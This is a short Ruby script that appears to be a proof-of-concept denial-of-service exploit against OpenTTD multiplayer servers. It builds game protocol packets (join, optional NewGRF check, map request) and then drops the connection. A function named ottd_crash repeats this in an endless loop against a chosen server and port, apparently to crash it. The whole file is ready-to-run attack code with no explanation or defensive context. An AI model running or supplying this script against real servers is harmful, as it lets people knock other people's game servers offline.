#!/usr/bin/ruby
require 'socket'

PACKET_CLIENT_JOIN                  = 2
PACKET_CLIENT_NEWGRFS_CHECKED       = 7
PACKET_CLIENT_GETMAP                = 14
PACKET = ['SERVER_FULL', 'SERVER_BANNED', 'CLIENT_JOIN', 'SERVER_ERROR', 'CLIENT_COMPANY_INFO', 'SERVER_COMPANY_INFO', 'SERVER_CHECK_NEWGRFS', 'CLIENT_NEWGRFS_CHECKED', 'SERVER_NEED_GAME_PASSWORD', 'CLIENT_GAME_PASSWORD', 'SERVER_NEED_COMPANY_PASSWORD', 'CLIENT_COMPANY_PASSWORD', 'SERVER_WELCOME', 'SERVER_CLIENT_INFO', 'CLIENT_GETMAP', 'SERVER_WAIT', 'SERVER_MAP_BEGIN', 'SERVER_MAP_SIZE', 'SERVER_MAP_DATA', 'SERVER_MAP_DONE', 'CLIENT_MAP_OK', 'SERVER_FRAME', 'CLIENT_ACK', 'SERVER_SYNC', 'CLIENT_COMMAND', 'SERVER_COMMAND', 'CLIENT_CHAT', 'SERVER_CHAT', 'CLIENT_RCON', 'SERVER_RCON', 'CLIENT_MOVE', 'SERVER_MOVE', 'CLIENT_SET_PASSWORD', 'CLIENT_SET_NAME', 'SERVER_COMPANY_UPDATE', 'SERVER_CONFIG_UPDATE', 'SERVER_NEWGAME', 'SERVER_SHUTDOWN', 'CLIENT_QUIT', 'SERVER_QUIT', 'CLIENT_ERROR', 'SERVER_ERROR_QUIT']

# arguments: server port revision hasNewGRF
server = ARGV.length >=1 ? ARGV[0] : 'localhost'
port = ARGV.length >= 2 ? ARGV[1] : 3979
revision = ARGV.length >= 3 ? ARGV[2] : 'r22064'
hasNewGRF = ARGV.length >= 4 ? ['true','True','TRUE','YES','1','y'].include?(ARGV[3]) : false

# packet creation function, adds the size and type header
def ottd_packet type, pkt = ''
  return [pkt.size+3, type, pkt].pack('vCa*')
end

# send a packet with the given type
def ottd_send sck, type, pkt = ''
  sck.send(ottd_packet(type, pkt), 0)
end

# receives a packet from the socket
def ottd_recv sck
  data = sck.recv(2)
  size = data.unpack('v')[0]
  type = sck.recv(1)
  data = sck.recv(size-3)
  return size, type.unpack('C')[0], data
end

def ottd_crash server, port, revision, hasNewGRF = false
  begin
    sck = TCPSocket.open(server,port)
    # packing: uint8: C, uint16: v, uint32: V, string: a*x
    ottd_send sck, PACKET_CLIENT_JOIN, [revision, 'ruby', 255, 0].pack('a*xa*xCC')
    ottd_send sck, PACKET_CLIENT_NEWGRFS_CHECKED if hasNewGRF
    ottd_send sck, PACKET_CLIENT_GETMAP
    sck.close
  rescue
  end
end

while true do
  ottd_crash(server, port, revision, hasNewGRF) 
end